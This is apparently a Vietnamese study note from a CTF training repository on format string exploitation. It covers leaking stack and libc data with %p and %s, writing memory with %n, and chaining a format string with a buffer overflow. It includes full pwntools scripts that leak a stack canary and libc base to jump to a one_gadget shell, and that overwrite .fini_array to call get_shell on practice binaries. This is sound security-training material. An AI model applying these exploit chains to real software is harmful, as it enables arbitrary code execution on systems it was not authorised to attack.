# Giới thiệu chung
- %p, in địa chỉ trên thanh ghi  
  - đối với biến khi a = "A"; print("%p", a) thì khi đến hàm print() trên thanh ghi rsi là 0x41 nên %p sẽ in ra giá trị 0x41  
  - đối với mảng khi a[10] = "ABCDEABCDE" thì print("%p", a) sẽ in ra địa chỉ đầu của mảng  
- %c in ra 1 byte đang có trên thanh ghi và in ra theo ascii nghĩa là 0x1234 thì %c sẽ in ra 0x34 và đổi về kí tự theo mã ascii  
- %s nhận vào địa chỉ và in ra chuỗi mà địa chỉ đó đang trỏ đến, còn đối với mảng, khi print("%s", a) thì thanh ghi sẽ tự truyền địa chỉ đầu mảng vào và 
- %s sẽ trỏ đến địa chỉ đó và in ra cho đến khi gặp 0x00  
- %n đếm số lượng byte được in ra trước nó, rồi ghi vào biến được truyền địa chỉ

> Lưu ý:  
> Đối với 32bit: in dữ liệu trên stack  
>	64bit: 5% đầu của 5 thanh ghi, % thứ 6 là dữ liệu trên stack  


# leak dữ liệu bằng %p
%p sẽ in dữ liệu trên stack dưới dạng hex()
p64(): pack64 chuyển hex sang bytes
u64():unpack chuyển bytes sang hex

# leak dữ liệu = %s
%s leak dữ liệu địa chỉ mà địa chỉ trỏ đến (con) trong con trỏ  

Lưu ý khi fread() đọc dữ liệu từ file vào chương trình, khi đó ta cần lưu ý ,cẩn thận có thể sẽ chia flag ra nhiều phần. 

# %n
để thay đổi dữ liệu của một biến, ta sẽ cho in ra %{giá trị cần thay đổi}$c sau đó dùng %n để đọc các byte đã in ra và lưu vào địa chỉ mà %n trỏ đến  
Trường hợp giá trị cần thay đổi quá lớn thì có thể chia thành 2 lần in, tuy nhiên lần thứ 2, %n sẽ đọc n byte của lần 1 và cộng m byte của lần 2

# FMT & BOF
ở đây ta sử dụng một công cụ mới khi bof ret2libc là one_gadget, one_gadget có chức năng liệt kê ra các system('/bin/sh') và các điều kiện đi kèm, thường dùng cho trường hợp PIE bật.
cú pháp: ``` one_gadget tênfile ```
![image](https://user-images.githubusercontent.com/111769169/221520986-6851fe89-f872-4afa-84c2-d708f57fafd1.png)  

<details> <summary> script </summary>

```python3
from pwn import *
exe = ELF("./fmtstr4_patched")
libc = ELF("./libc-2.31.so")
p = process(exe.path)
gdb.attach(p, gdbscript = '''

b*main+354
c
           ''')
input()

payload = b'01234456789 %21$p %23$p'
p.sendafter(b"ID: ", payload)
p.sendafter(b'Password: ', b'&WPAbC&M!%8S5X#W')
p.recvuntil(b"01234456789 ")

canary = int(p.recv(18), 16)
leak_libc = int(p.recvuntil(b"Enter", drop = True)[1:], 16)
libc.address = leak_libc - 0x24083
log.info('canary: ' + hex(canary))
log.info('leak libc: ' + hex(leak_libc))
log.info('base: ' + hex(libc.address))
log.info('system ' + hex(libc.sym['system']))

one_gadget = libc.address + 0xe3b01
payload2 = b'a' * 56 + p64(canary) + b'b' *8
payload2 +=  p64(one_gadget)
p.sendafter(b"your secret: ", payload2)
p.interactive()
```

</details>

# %*
[FMT_Xmaster.md](https://github.com/wan-hyhty/trainning/blob/task3/FMT/FMT_Xmaster.md)

# Tấn công GOT 
[xFMasTree.md](https://github.com/wan-hyhty/trainning/blob/task3/FMT/xFMasTree.md)  

# Tấn công .fini_array  

đặc điểm nhận dạng: con trỏ không phải địa chỉ stack, hay binary, như lại trỏ đến địa chỉ là base của binary, gần biến môi trường  
.fini_array: là mảng, chứa địa chỉ để thực thi khi chương trình exit, khi đó chương trình sẽ lấy địa chỉ base + với offset để thực thi  
  
Nhiệm vụ của chúng ta là thay đổi địa chỉ con trỏ trỏ đến địa chỉ mới  
Đầu tiên tìm offset fini_array: dùng info files  
bước 2 leak exe  
bước 3 kiểm tra vùng read write, viết địa chỉ hàm get_shell vào vùng địa chỉ đó  
Ở đây ta chú ý  
```python
# offset từ vị trí ta viết hàm shell và base 0x40e0
package = {
    exe.sym['get_shell'] >> 0 & 0xffff: exe.address + 0x40e0,       #lấy 2 byte đầu, gán exe.address + 0x40e0
    exe.sym['get_shell'] >> 16 & 0xffff: exe.address + 0x40e0+2,
    exe.sym['get_shell'] >> 32 & 0xffff: exe.address + 0x40e0+4,
}
order = sorted(package) #sắp xếp giá trị để khi %c ta sẽ chỉ cần cộng từ nhở đến lớn

payload2 = f'%{order[0]}c%13$hn'.encode()               #ở đây payload sẽ lấy order 0 được gán giá trị  exe.address + 0x40e0
payload2 += f'%{order[1] - order[0]}c%14$hn'.encode()
payload2 += f'%{order[2] - order[1]}c%15$hn'.encode()
payload2 = payload2.ljust(64 - 24, b'a')
payload2 += p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
```
<details> <summary> script </summary>
  
  ```python
  from pwn import *

exe = ELF('./fmtstr8_patched', checksec=False)
libc = ELF("libc-2.31.so", checksec=False)
p = process(exe.path)
gdb.attach(p, gdbscript='''
           b* main+136
           c
           ''')
input()

# offset fini_array = 0x3d90

### Leak binary ###
payload1 = b"%23$p"
p.sendlineafter(b"something: ", payload1)
p.recvuntil(b"said: ")
leak_exe = int(p.recvline(keepends=False), 16)
exe.address = leak_exe - exe.sym['main']
p.sendlineafter(b"> ", b'n')
log.info("leak exe: " + hex(leak_exe))
log.info("base exe: " + hex(exe.address))

### viet ham get_shell ###
# offset 0x40e0
package = {
    exe.sym['get_shell'] >> 0 & 0xffff: exe.address + 0x40e0,
    exe.sym['get_shell'] >> 16 & 0xffff: exe.address + 0x40e0+2,
    exe.sym['get_shell'] >> 32 & 0xffff: exe.address + 0x40e0+4,
}
order = sorted(package)

payload2 = f'%{order[0]}c%13$hn'.encode()
payload2 += f'%{order[1] - order[0]}c%14$hn'.encode()
payload2 += f'%{order[2] - order[1]}c%15$hn'.encode()
payload2 = payload2.ljust(64 - 24, b'a')
payload2 += p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
print(package)
print(order)
p.sendlineafter(b'something: ', payload2)
p.sendlineafter(b"> ", b'n')
### fini_array ###
# 0x00564529b7b000 + x + 0x3d90 = 0x564529b7f0e0 
# 0x564529b7f0e0 - 0x3d90 - 0x00564529b7b000 = 0x350
payload3 = f'%{(exe.address + 0x350) & 0xffff}c%38$hn'.encode()

p.sendlineafter(b'something: ', payload3)
p.sendlineafter(b"> ", b'y')
p.interactive()

  ```
  
  </details>
  
